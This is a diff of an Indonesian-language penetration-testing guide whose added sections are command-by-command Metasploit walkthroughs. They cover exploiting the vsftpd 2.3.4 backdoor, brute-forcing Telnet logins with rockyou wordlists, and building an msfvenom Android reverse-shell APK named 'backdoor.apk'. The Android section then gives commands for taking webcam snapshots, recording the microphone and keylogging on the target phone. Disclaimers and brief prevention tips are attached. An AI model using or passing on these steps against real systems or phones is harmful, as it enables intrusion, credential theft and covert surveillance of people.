@@ -269,73 +269,191 @@ Pada alamat IP 192.168.1.4, Nmap menemukan bahwa kredensial tomcat:tomcat adalah
 
 ================================================================================================
 
-## STEP BY STEP EXPLOITATION `vsftpd 2.3.4` Metasploit-framework
-Langkah-langkah ini secara umum mencakup pencarian kelemahan (vulnerabilities) pada sistem target dan eksploitasi kelemahan tersebut menggunakan alat seperti Metasploit Framework. Metode ini umumnya digunakan oleh peneliti keamanan atau profesional keamanan informasi untuk mengidentifikasi dan memperbaiki kelemahan yang mungkin dapat dieksploitasi oleh penyerang. Ini penting dalam memastikan bahwa sistem dan jaringan memiliki tingkat keamanan yang tinggi terhadap potensi ancaman.
-
-1. Temukan port terbuka pada target menggunakan nmap `sudo nmap -sV ip_address_target`.
-    - sebagai contoh disini saya akan mencoba mengekspolit port 21 yaitu `vsFTPd 2.3.4`
-2. Untuk melihat exploit apa yang dapat digunakan untuk mengeksploitasi `vsFTPd`, gunakan perintah `searchsploit vsftpd 2.3.4`.
-   - <img width="450" alt="Screenshot 2023-12-22 at 12 32 05" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/2872fcef-a89c-44f4-8a81-292c6ef67e0f">
-
-3. Selanjutnya, buka `MSFCONSOLE` untuk membuka Metasploit.
-    - <img width="350" alt="Screenshot 2023-12-22 at 17 50 47" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/54695667-4e87-4ec2-9974-1ef268c5e864">
-
-4. Cari exploit yang dapat digunakan untuk mengeksploitasi `vsFTPd` menggunakan perintah `search vsftpd 2.3.4`.
-    - <img width="450" alt="Screenshot 2023-12-22 at 17 59 37" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/b5ee22e7-a81d-444b-8dd2-865126699078">
-
-5. Cara menggunakan exploit adalah dengan menggunakan perintah `use 0` (bisa menggunakan nomor di depan).
-   - <img width="490" alt="Screenshot 2023-12-22 at 18 06 38" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/9b6ba305-5bb1-4afa-b70c-70d894ab760b">
-
-6. Cara mengetahui informasi tentang exploit yang baru digunakan adalah dengan menggunakan perintah `show info`.
-   - <img width="450" alt="Screenshot 2023-12-22 at 18 09 52" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/58916478-3864-439f-bb11-022735a7dd0e">
-
-7. Jika `RHOST` masih kosong, kita harus mengisinya.
-8. Cara memasukkan `RHOST (IP TARGET)` adalah dengan menggunakan perintah `set RHOSTS ip_addres_target`.
-    - <img width="450" alt="Screenshot 2023-12-22 at 18 13 54" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/944e24ed-ad09-42fb-81a7-d5d6c4f673f6">
-
-9. Untuk memastikan apakah sudah terisi atau belum, gunakan perintah `SHOW OPTIONS`.
-10. Cara mengeksploitasi mesin target adalah dengan menggunakan perintah `EXPLOIT` / `RUN`.
-    - <img width="450" alt="Screenshot 2023-12-22 at 18 18 23" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/4e88b2fd-4576-440f-987c-bc7a2ec1323a">
-
-11. Untuk keluar, gunakan perintah `EXIT`.
-
 <br>
 ================================================================================================
+
+## STEP BY STEP EXPLOITATION `vsftpd 2.3.4` Metasploit-framework
+
+## 📌 Pendahuluan
+**vsftpd 2.3.4** adalah versi rentan dari **Very Secure FTP Daemon (vsftpd)** yang memiliki backdoor yang memungkinkan **remote code execution (RCE)**. Kerentanan ini memungkinkan penyerang mendapatkan akses shell pada sistem target.
+
+> **Layanan Rentan:** vsftpd 2.3.4  
+> **CVE:** CVE-2011-2523  
+> **Platform Target:** Linux  
+
+---
+
+## 🔥 1. Menyiapkan Lab
+Sebelum memulai, pastikan Anda memiliki:
+- **Kali Linux** (sebagai mesin penyerang) dengan **Metasploit Framework** terinstal.
+- **Mesin target** yang menjalankan **vsftpd 2.3.4** (seperti Metasploitable 2 atau sistem Linux yang rentan).
+
+---
+
+## 🎯 2. Memindai Target dengan Nmap
+Gunakan **Nmap** untuk mendeteksi apakah target menjalankan **vsftpd 2.3.4**:
+
+```bash
+nmap -p 21 -sV <IP_TARGET>
+```
+
+📌 **Contoh hasil pemindaian yang menunjukkan target rentan:**
+```
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+```
+Jika hasilnya menunjukkan **vsftpd 2.3.4**, maka target dapat dieksploitasi.
+
+---
+
+## 💀 3. Mengeksploitasi vsftpd 2.3.4 dengan Metasploit
+Setelah mengidentifikasi target, jalankan **Metasploit Framework**:
+
+```bash
+msfconsole
+```
+
+Gunakan modul exploit **vsftpd 2.3.4**:
+
+```bash
+use exploit/unix/ftp/vsftpd_234_backdoor
+```
+
+Atur **IP target**:
+
+```bash
+set RHOSTS <IP_TARGET>
+```
+
+Jalankan exploit:
+
+```bash
+exploit
+```
+
+---
+
+## 🖥 4. Jika Eksploitasi Berhasil
+Jika berhasil, Anda akan mendapatkan sesi shell dengan sistem target:
+
+```
+[*] Command shell session opened
+```
+
+Sekarang Anda dapat menjalankan perintah berikut:
+
+- **Melihat isi direktori:**
+  ```bash
+  ls -la
+  ```
+- **Melihat informasi sistem:**
+  ```bash
+  uname -a
+  ```
+- **Mencoba eskalasi hak akses:**
+  ```bash
+  sudo -i
+  ```
+
+---
+
+## 🛡 5. Mencegah Eksploitasi
+Untuk melindungi sistem dari serangan ini:
+- **Perbarui vsftpd** ke versi terbaru:
+  ```bash
+  sudo apt update && sudo apt upgrade
+  ```
+- **Batasi akses** ke port 21 menggunakan firewall.
+- **Nonaktifkan vsftpd** jika tidak diperlukan:
+  ```bash
+  sudo systemctl stop vsftpd
+  ```
+
+---
+
+## ⚠ Disclaimer Hukum
+Panduan ini dibuat hanya untuk **pengujian keamanan dan ethical hacking**. Penggunaan exploit ini untuk tujuan ilegal **melanggar hukum** dan merupakan tanggung jawab pengguna sepenuhnya.
+
+---
+
+🚀 **Hanya untuk tujuan edukasi!**
+
+
+
+================================================================================================
+
 
 ## STEP BY STEP EXPLOITATION `Telnet`
 
-Eksploitasi pada port 23, yang merupakan port standar untuk layanan Telnet, dapat berbahaya karena Telnet mengirim informasi, termasuk kata sandi, dalam bentuk teks biasa tanpa enkripsi. Telnet adalah protokol lama dan tidak aman yang digunakan untuk mengakses dan mengelola perangkat jarak jauh. Seiring waktu, Telnet telah digantikan oleh protokol yang lebih aman seperti SSH.
+## 📌 Pendahuluan
+**Telnet** adalah protokol komunikasi lama yang sering digunakan untuk mengakses sistem jarak jauh. Namun, karena tidak memiliki enkripsi, **Telnet sangat rentan terhadap serangan seperti credential sniffing, brute force, dan remote code execution**.
 
-1. Gunakan perintah `telnet ip_address`
-  - <img width="450" alt="Screenshot 2023-12-22 at 19 51 09" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/6e78f2b2-7374-405e-a723-2dc49fb059c3">
+> **Layanan Rentan:** Telnet  
+> **Port Default:** 23  
+> **Platform Target:** Linux, Windows  
 
-2. Login menggunakan `msfadmin` dan password: `msfadmin`
-3. kini kita sudah berhasil mengeksploit dan masuk ke target mesin
-  - <img width="450" alt="Screenshot 2023-12-22 at 19 54 24" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/4fdae79f-5a3c-403b-9117-8f5377676763">
-4. Untuk masuk sebagai `root` gunakan perintah `sudo su`, jika meminta password, passwordnya adalah `msfadmin`.
+---
 
-<br>
-================================================================================================
+## 🔥 1. Mempersiapkan Lab
+Sebelum memulai, pastikan Anda memiliki:
+- **Kali Linux** (sebagai mesin penyerang) dengan **Metasploit Framework** dan **Nmap** terinstal.
+- **Mesin target** yang menjalankan **Telnet Server** (seperti Metasploitable 2 atau sistem Linux rentan).
+- Koneksi jaringan yang memungkinkan komunikasi antara mesin penyerang dan target.
 
-## STEP BY STEP EXPLOITATION `Samba samb 3.X 4.X`
+---
 
-1. di bagian ini saya akan menggunakan `Scanner` untuk menegetahui versi dari service tersebut.
-2. cd ke `/usr/share/metasploit-framework/modules/auxiliary/scanner/smb` untuk menggunakan `smb_version.rb`.
-3. selanjutnya gunakan perintah `msfconsole` untuk membuka metasploit.
-4. gunakan perintah `use auxiliary/scanner/smb/` tekan `enter`.
-5. pilih `smb_version` dengan menggunakan perintah `use 12`.
-6. untuk mengetahui informasi tentang exploit yang baru digunakan adalah dengan menggunakan perintah `show info`.
-7. untuk memasukkan `RHOST (IP TARGET)` adalah dengan menggunakan perintah `set RHOSTS ip_addres_target`.
-8. gunakan perintah `run` untuk menggunakan Scanner dan untuk melihat hasil dari scannernya.
-9. dan versi dari samba tersebut ada lah `Samba 3.0.20`
-  - <img width="450" alt="Screenshot 2023-12-22 at 20 40 49" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/f213a32a-1143-4e41-a83f-8018bcfbe97a">
-10. untuk mencari exploitnya gunakan perintah `searchsploit samba 3.0.20`.
-11. buka metasploit gunakan perintah `msfconsole`.
-12. cari exploit `samba 3.0.2` gunakan perintah `search samba 3.0.20`.
-13. dan pilih exploit tersebut gunakan perintah `use 0`.
-14. untuk melihat semua `options` nya gunakan perintah `show options`
-15. Cara memasukkan `RHOST (IP TARGET)` adalah dengan menggunakan perintah `set RHOSTS ip_addres_target`.
-16. Cara mengeksploitasi mesin target adalah dengan menggunakan perintah `EXPLOIT` / `RUN`.
+## 🎯 2. Menemukan Target dengan Nmap
+Gunakan **Nmap** untuk mendeteksi apakah target menjalankan **Telnet**:
+
+```bash
+nmap -p 23 -sV <IP_Target>
+```
+
+📌 **Contoh hasil pemindaian jika Telnet aktif:**
+```
+PORT   STATE SERVICE VERSION
+23/tcp open  telnet  Linux telnetd
+```
+Jika port **23** terbuka dan Telnet terdeteksi, target dapat dieksploitasi.
+
+---
+
+## 💀 3. Mengeksploitasi Telnet
+### **A. Serangan Brute Force (Metasploit)**
+Jika Telnet tidak memiliki keamanan yang kuat, kita bisa menggunakan **Metasploit** untuk brute-force username dan password.
+
+1️⃣ Jalankan **Metasploit**:
+
+```bash
+msfconsole
+```
+
+2️⃣ Gunakan modul brute-force Telnet:
+
+```bash
+use auxiliary/scanner/telnet/telnet_login
+```
+
+3️⃣ Atur IP target:
+
+```bash
+set RHOSTS <IP_Target>
+```
+
+4️⃣ Atur file wordlist untuk serangan brute-force:
+
+```bash
+set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+```
+
+5️⃣ Jalankan serangan:
+
+```bash
+run
+```
+
+📌 **Jika berhasil**, Metasploit akan menampilkan kredensia
 
 <br>
 ================================================================================================
@@ -496,6 +614,118 @@ Port 6667 adalah port yang umumnya digunakan untuk layanan Internet Relay Chat (
 
 <br>
 ================================================================================================
+
+# Panduan Menggunakan MSFvenom untuk Eksploitasi Ponsel Android
+
+---
+
+## 📌 Persiapan
+
+Sebelum memulai, pastikan Anda memiliki:
+
+- **Kali Linux** atau distribusi Linux lain dengan **Metasploit Framework** terinstal.
+- Akses ke ponsel Android target.
+- IP Address yang bisa dijangkau oleh target (bisa menggunakan jaringan lokal atau port forwarding).
+
+---
+
+## 🔥 1. Membuat Payload APK dengan MSFvenom
+
+Gunakan perintah berikut untuk membuat payload APK yang akan digunakan untuk eksploitasi:
+
+```bash
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP_Anda> LPORT=<Port> -o backdoor.apk
+```
+
+📌 **Penjelasan:**
+
+- `-p android/meterpreter/reverse_tcp` → Payload untuk Android dengan koneksi reverse TCP.
+- `LHOST=<IP_Anda>` → IP address listener (cek dengan `ifconfig`).
+- `LPORT=<Port>` → Port yang digunakan untuk komunikasi.
+- `-o backdoor.apk` → Nama file APK yang akan dihasilkan.
+
+**Contoh:**
+
+```bash
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o hack.apk
+```
+
+---
+
+## 🎯 2. Menyiapkan Listener di Metasploit
+
+Setelah payload APK dibuat, kita harus menjalankan listener di Metasploit:
+
+```bash
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+set LPORT 4444
+exploit
+```
+
+Jika target menginstal dan membuka aplikasi, Anda akan mendapatkan sesi **Meterpreter**.
+
+---
+
+## 🔍 3. Mengontrol Perangkat Target
+
+Setelah sesi aktif, gunakan beberapa perintah berikut:
+
+- **Melihat informasi perangkat:**
+  ```bash
+  sysinfo
+  ```
+- **Mengakses file target:**
+  ```bash
+  cd /sdcard/
+  ls
+  ```
+- **Mengaktifkan kamera:**
+  ```bash
+  webcam_snap
+  ```
+- **Merekam suara:**
+  ```bash
+  record_mic 10
+  ```
+  *(Merekam selama 10 detik)*
+- **Mengaktifkan keylogger:**
+  ```bash
+  keyscan_start
+  ```
+- **Mendapatkan shell Android:**
+  ```bash
+  shell
+  ```
+
+---
+
+## 🔒 4. Pencegahan dan Keamanan
+
+Untuk mencegah serangan serupa pada perangkat Anda:
+
+- Jangan menginstal APK dari sumber tidak dikenal.
+- Aktifkan **Google Play Protect**.
+- Gunakan VPN dan firewall di ponsel Anda.
+- Selalu update sistem operasi.
+
+---
+
+## ⚠ Legal Disclaimer
+
+Semua informasi di repositori ini hanya untuk **tujuan edukasi dan ethical hacking**. Penyalahgunaan teknik ini untuk tujuan ilegal adalah **tanggung jawab pengguna sepenuhnya**.
+
+---
+
+**🔥 Created for Ethical Hacking & Penetration Testing 🔥**
+
+
+
+
+================================================================================================
+
 
 # BeEF (Browser Exploitation Framework)
 
